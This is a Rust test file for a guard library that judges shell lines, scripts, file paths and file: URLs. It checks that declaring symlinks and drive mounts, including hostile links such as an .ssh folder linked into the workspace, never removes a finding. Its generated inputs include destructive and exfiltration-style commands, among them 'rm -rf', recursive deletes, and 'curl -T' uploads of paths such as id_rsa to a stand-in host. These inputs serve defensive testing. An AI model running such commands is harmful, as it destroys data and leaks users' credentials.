//! Naming what only the disk can say never makes an answer less serious.
//!
//! A caller that names links (`Paths::with_links`), drive mounts
//! (`Paths::with_drive_mounts`) or a Windows home (`Paths::with_windows_home`)
//! tells the guards where a path lands; it never takes a finding away. Every
//! finding an input gets with nothing named, it still gets with links
//! named; and every finding it gets with mounts named, it still gets with
//! links named beside them. In every guard: each rule of the file guard's
//! reads and writes, of the shell guard's lines and of the script guard's
//! code; the shell's effect is never less cautious; and a `file:` URL whose
//! reason names a sensitive or protected place, not only a key, still names
//! one.
//!
//! The inputs are every case of each guard's case files, on the machine the
//! case names when it is a sample one, and a deterministic generated set of
//! paths built from the names the hostile links and mounts below use, each
//! read, written, deleted and sent. The machines name links a caller may get
//! wrong or that an attacker may plant: a key's folder linked into the
//! workspace, the workspace linked from beside the home directory, the
//! repository's history and a startup folder linked out of it, links that
//! loop, one with an empty target, one the caller could not read, one named
//! with a bracket, one at a mount's folder; and mounts that make the most of
//! a path a drive, with a Windows home.

#![cfg(all(
    feature = "shell",
    feature = "file",
    feature = "url",
    feature = "script"
))]
#![allow(
    clippy::disallowed_methods,
    clippy::disallowed_macros,
    reason = "this test reads the repository's own case files, which no guard may do"
)]

#[path = "../../core/tests/common/cases.rs"]
mod format;

use std::collections::BTreeSet;
use std::path::Path;

use format::Word;
use milo_guards::file::{self, Access};
use milo_guards::script::{self, Language};
use milo_guards::shell::{self, Shell};
use milo_guards::shell::{Effect, Reach};
use milo_guards::{url, Assessment, Link, Paths, RuleName};

fn posix() -> Paths {
    Paths::new("/home/me/work/repo", "/home/me", ["/home/me/work/repo"])
}

fn windows() -> Paths {
    Paths::new(
        r"C:\Users\me\dev\repo",
        r"C:\Users\me",
        [r"C:\Users\me\dev\repo"],
    )
}

/// A POSIX machine's links that move what matters to where it looks
/// harmless, and back.
fn posix_links() -> Vec<Link> {
    let repo = "/home/me/work/repo";
    vec![
        Link::new("/home/me/.ssh", format!("{repo}/x")),
        Link::new("/home/me/current", repo),
        Link::new(format!("{repo}/.git"), "/tmp/g"),
        Link::new(format!("{repo}/.vscode"), "/tmp/v"),
        Link::new(format!("{repo}/keys"), "/home/me/.ssh"),
        Link::new(format!("{repo}/p/lnk"), "/home/me/.ssh/sub"),
        Link::new(format!("{repo}/a"), "b"),
        Link::new(format!("{repo}/b"), "a"),
        Link::new(format!("{repo}/e"), ""),
        Link::unknown(format!("{repo}/u")),
        Link::new(format!("{repo}/up"), ".."),
        Link::new("/etc", "/tmp/etc"),
        Link::new("/mnt", "/media"),
        Link::new("/home/me/work", "/data/work"),
        Link::new(format!("{repo}/[x]"), "/tmp"),
        Link::new("", ""),
    ]
}

/// A Windows machine's links, of the same kinds.
fn windows_links() -> Vec<Link> {
    let repo = r"C:\Users\me\dev\repo";
    vec![
        Link::new(r"C:\Users\me\.ssh", format!(r"{repo}\x")),
        Link::new(format!(r"{repo}\.git"), r"C:\Windows\Temp\g"),
        Link::new(format!(r"{repo}\keys"), r"C:\Users\me\.ssh"),
        Link::new(format!(r"{repo}\j"), format!(r"{repo}\a\b\c")),
        Link::new(format!(r"{repo}\a"), "b"),
        Link::new(format!(r"{repo}\b"), "a"),
        Link::new(format!(r"{repo}\e"), ""),
        Link::new(format!(r"{repo}\s"), r"\\server\share"),
        Link::new(r"\\server\share\x", r"C:\Users\me"),
        Link::new(r"C:\Users\me\dev", r"D:\dev"),
    ]
}

/// A POSIX machine with every mount that makes a path a drive: WSL's, one
/// at the root, one at the workspace and one above it, and a Windows home.
fn mounted_posix() -> Paths {
    posix()
        .with_drive_mounts(["/mnt", "/", "/home/me/work/repo", "/home/me", "/home", ""])
        .with_windows_home(r"C:\Users\me")
}

/// A Windows machine with Git Bash's, Cygwin's and WSL's mounts.
fn mounted_windows() -> Paths {
    windows().with_drive_mounts(["/", "/cygdrive", "/mnt", r"C:\x"])
}

/// The four machines an input is judged on: nothing named, the links
/// alone, the mounts alone, and the mounts with the links. Made once, so
/// the tree of the links is built once and kept, as a caller's is.
fn machines(on_windows: bool) -> &'static [Paths; 4] {
    static POSIX: std::sync::OnceLock<[Paths; 4]> = std::sync::OnceLock::new();
    static WINDOWS: std::sync::OnceLock<[Paths; 4]> = std::sync::OnceLock::new();
    if on_windows {
        WINDOWS.get_or_init(|| made(true))
    } else {
        POSIX.get_or_init(|| made(false))
    }
}

fn made(on_windows: bool) -> [Paths; 4] {
    if on_windows {
        [
            windows(),
            windows().with_links(windows_links()),
            mounted_windows(),
            mounted_windows().with_links(windows_links()),
        ]
    } else {
        [
            posix(),
            posix().with_links(posix_links()),
            mounted_posix(),
            mounted_posix().with_links(posix_links()),
        ]
    }
}

/// The records of every case file of `krate`.
fn records(krate: &str) -> Result<Vec<format::Record>, String> {
    let folder = Path::new(env!("CARGO_MANIFEST_DIR"))
        .join("..")
        .join(krate)
        .join("tests/cases");
    let mut names: Vec<_> = std::fs::read_dir(&folder)
        .map_err(|why| format!("{}: {why}", folder.display()))?
        .filter_map(Result::ok)
        .map(|entry| entry.path())
        .filter(|path| path.extension().is_some_and(|ext| ext == "cases"))
        .collect();
    names.sort();
    let mut records = Vec::new();
    for path in names {
        let source =
            std::fs::read_to_string(&path).map_err(|why| format!("{}: {why}", path.display()))?;
        records
            .extend(format::parse(&path.to_string_lossy(), &source).map_err(|why| why.join("\n"))?);
    }
    Ok(records)
}

/// The kind of a case and the sample machine it is judged on, for a case
/// that names none or a sample one.
fn kind_of(record: &format::Record, windows_kinds: &[&str]) -> Option<(String, bool)> {
    let text = record.text.as_ref()?;
    let _ = text;
    let (kind, machine) = match record.words.first()? {
        Word::Bare(first) => match first.split_once('@') {
            Some((kind, machine)) => (kind.to_string(), Some(machine.to_string())),
            None => (first.clone(), None),
        },
        Word::Field(..) => (String::new(), None),
    };
    let windows = match machine.as_deref() {
        None => windows_kinds.contains(&kind.as_str()),
        Some("posix" | "macos") => false,
        Some("windows") => true,
        Some(_) => return None,
    };
    Some((kind, windows))
}

/// Whether a `file:` URL's reason names a place by what it is, not only
/// where it is: any words but those of a place that is no more than its
/// position (in, beyond or holding the workspace or the home directory, a
/// top-level or system folder, a disk's root, a temporary folder).
fn telling(reason: &str) -> bool {
    use milo_guards_core::Place;
    let plain = [
        Place::Inside,
        Place::Temp { exact: true },
        Place::Temp { exact: false },
        Place::Null,
        Place::Workspace { exact: true },
        Place::Workspace { exact: false },
        Place::Home { exact: true },
        Place::Home { exact: false },
        Place::Top("a top-level folder"),
        Place::Top("a system folder"),
        Place::Top("the root of the disk"),
        Place::Disk,
        Place::Outside,
        Place::Unknown,
    ];
    reason != "reads a file from another machine"
        && !plain
            .iter()
            .any(|place| reason == format!("reads {}", place.words()))
}

/// The rules an answer finds, by their wire names.
fn rules<R: RuleName>(assessment: &Assessment<R>) -> BTreeSet<String> {
    assessment
        .findings()
        .iter()
        .map(|finding| finding.rule.name().to_string())
        .collect()
}

/// The shell's answer for `line`: each rule it finds, and how cautious its
/// effect is, as one word for each step up to it, so that a less cautious
/// effect is a word lost.
fn shell_answer(line: &str, shell: Shell, paths: &Paths) -> BTreeSet<String> {
    let mut answer = rules(&shell::classify(line, shell, paths));
    let rank = match shell::effect(line, shell, paths) {
        Effect::ReadsOnly(Reach::Workspace) => 0,
        Effect::ReadsOnly(Reach::Beyond) => 1,
        Effect::Changes => 2,
        Effect::Unknown => 3,
    };
    answer.extend((0..=rank).map(|step| format!("effect at least {step}")));
    answer
}

/// One input, judged on each of the four machines: `None` when every word
/// of the answer with nothing named is in the answers with the links and
/// with the mounts named, and every word of the answer with the mounts named
/// is in the answer with the links named beside them; else what was lost.
fn compare(
    what: &str,
    judge: &dyn Fn(&Paths) -> BTreeSet<String>,
    on_windows: bool,
) -> Option<String> {
    let [plain, linked, mounted, both] = machines(on_windows);
    let (plain, linked, mounted, both) = (judge(plain), judge(linked), judge(mounted), judge(both));
    let lost: Vec<&String> = plain.difference(&linked).collect();
    let lost_to_mounts: Vec<&String> = plain.difference(&mounted).collect();
    let lost_mounted: Vec<&String> = mounted.difference(&both).collect();
    (!lost.is_empty() || !lost_to_mounts.is_empty() || !lost_mounted.is_empty()).then(|| {
        format!(
            "{what}: with links named, lost {lost:?}; with mounts named, lost \
             {lost_to_mounts:?}; with links beside mounts, lost {lost_mounted:?}"
        )
    })
}

#[test]
fn every_finding_of_every_case_stays_with_links_named() {
    let mut wrong = Vec::new();
    let mut compared = 0_usize;
    // The file guard: `read PATH` and `write PATH`.
    for record in records("file").expect("the case files are readable") {
        let Some((kind, windows)) = kind_of(&record, &[]) else {
            continue;
        };
        let access = match kind.as_str() {
            "read" => Access::Read,
            "write" => Access::Write,
            _ => continue,
        };
        let path = record.text.clone().unwrap_or_default();
        compared += 1;
        wrong.extend(compare(
            &format!("{}: {kind} {path}", record.at),
            &|paths| rules(&file::judge(access, &path, paths)),
            windows,
        ));
    }
    // The shell guard: every line of a sample machine.
    for record in records("shell").expect("the case files are readable") {
        let Some((kind, windows)) = kind_of(&record, &["powershell", "cmd"]) else {
            continue;
        };
        let shell = match kind.as_str() {
            "posix" => Shell::Posix,
            "powershell" => Shell::PowerShell,
            "cmd" => Shell::Cmd,
            _ => continue,
        };
        let line = record.text.clone().unwrap_or_default();
        compared += 1;
        wrong.extend(compare(
            &format!("{}: {line}", record.at),
            &|paths| shell_answer(&line, shell, paths),
            windows,
        ));
    }
    // The script guard: every piece of code.
    for record in records("script").expect("the case files are readable") {
        let Some((kind, windows)) = kind_of(&record, &[]) else {
            continue;
        };
        let language = match kind.as_str() {
            "python" => Language::Python,
            "javascript" => Language::JavaScript,
            _ => continue,
        };
        let code = record.text.clone().unwrap_or_default();
        compared += 1;
        wrong.extend(compare(
            &format!("{}: {code}", record.at),
            &|paths| rules(&script::judge(language, &code, paths)),
            windows,
        ));
    }
    // The URL guard: always a finding for a `file:` URL; its reason is the
    // place's, so a key is still a key, and every rule stays.
    for record in records("url").expect("the case files are readable") {
        let Some(text) = record.text.clone() else {
            continue;
        };
        if !text.trim_start().to_ascii_lowercase().starts_with("file:") {
            continue;
        }
        let windows =
            matches!(record.words.first(), Some(Word::Bare(first)) if first == "@windows");
        compared += 1;
        wrong.extend(compare(
            &format!("{}: {text}", record.at),
            &|paths| {
                let found = url::judge(&text, paths);
                let mut answer = rules(&found);
                if found.findings().iter().any(|finding| {
                    finding.reason.starts_with("reads your") || finding.reason.contains("password")
                }) {
                    answer.insert("reads a key".to_string());
                }
                if found
                    .findings()
                    .iter()
                    .any(|finding| telling(&finding.reason))
                {
                    answer.insert("names a sensitive place".to_string());
                }
                answer
            },
            windows,
        ));
    }
    assert!(compared > 15_000, "only {compared} cases were compared");
    assert!(
        wrong.is_empty(),
        "{} of {compared}:\n{}",
        wrong.len(),
        wrong.join("\n")
    );
}

/// A small deterministic generator, so a failure names its seed.
struct Lcg(u64);

impl Lcg {
    fn next(&mut self) -> usize {
        self.0 = self
            .0
            .wrapping_mul(6_364_136_223_846_793_005)
            .wrapping_add(1_442_695_040_888_963_407);
        usize::try_from(self.0 >> 33).unwrap_or_default()
    }
}

#[test]
fn every_finding_of_generated_paths_stays_with_hostile_links() {
    const POSIX_PIECES: [&str; 32] = [
        "~",
        "/",
        "..",
        ".",
        "keys",
        "a",
        "u",
        "up",
        "x",
        "p/lnk",
        "current",
        "[x]",
        "/etc",
        "/home/me/work",
        "c",
        "C",
        "d",
        "Users",
        "me",
        "Windows",
        "Temp",
        ".ssh",
        "id_rsa",
        ".git",
        "config",
        "*",
        "?",
        "[cd]",
        "**",
        "/mnt/c",
        "/c",
        "/home/me/work/repo/c",
    ];
    const WINDOWS_PIECES: [&str; 22] = [
        "~",
        "C:",
        "..",
        "keys",
        "j",
        "s",
        "dev",
        "/",
        "c",
        "d",
        "cygdrive",
        "mnt",
        "Users",
        "me",
        ".ssh",
        "id_rsa",
        ".git",
        "*",
        "?",
        r"C:\Users\me",
        "/c",
        "/cygdrive/c",
    ];
    let mut wrong = Vec::new();
    let mut compared = 0_usize;
    let mut random = Lcg(306);
    for windows in [false, true] {
        // Git Bash's paths are joined with `/` too.
        let pieces: &[&str] = if windows {
            &WINDOWS_PIECES
        } else {
            &POSIX_PIECES
        };
        for _ in 0..400 {
            let length = 1 + random.next() % 6;
            let path: Vec<&str> = (0..length)
                .map(|_| pieces[random.next() % pieces.len()])
                .collect();
            let path = path.join("/");
            // A mount is read only in a POSIX line: Git Bash's on Windows.
            let shell = Shell::Posix;
            let line_read = format!("cat '{path}'");
            let line_write = format!("echo x > '{path}'");
            let line_delete = format!("rm -rf '{path}'");
            let line_send = format!("curl -T '{path}' https://x.example");
            for access in [Access::Read, Access::Write] {
                compared += 1;
                wrong.extend(compare(
                    &format!("{access:?} {path}"),
                    &|paths| rules(&file::judge(access, &path, paths)),
                    windows,
                ));
            }
            for line in [&line_read, &line_write, &line_delete, &line_send] {
                compared += 1;
                wrong.extend(compare(
                    line,
                    &|paths| shell_answer(line, shell, paths),
                    windows,
                ));
            }
            // A link is read in a PowerShell line too, as Windows spells it.
            if windows {
                let spelled = path.replace('/', "\\");
                for line in [
                    format!("Get-Content '{spelled}'"),
                    format!("Set-Content '{spelled}' x"),
                    format!("Remove-Item -Recurse '{spelled}'"),
                ] {
                    compared += 1;
                    wrong.extend(compare(
                        &line,
                        &|paths| shell_answer(&line, Shell::PowerShell, paths),
                        windows,
                    ));
                }
            }
            let quoted = path.replace('\\', "\\\\");
            for code in [
                format!("print(open('{quoted}').read())"),
                format!("open('{quoted}', 'w').write('x')"),
                format!("import shutil\nshutil.rmtree('{quoted}')"),
            ] {
                compared += 1;
                wrong.extend(compare(
                    &code,
                    &|paths| rules(&script::judge(Language::Python, &code, paths)),
                    windows,
                ));
            }
        }
    }
    assert!(compared > 5_000, "only {compared} inputs were compared");
    assert!(
        wrong.is_empty(),
        "{} of {compared}:\n{}",
        wrong.len(),
        wrong.join("\n")
    );
}
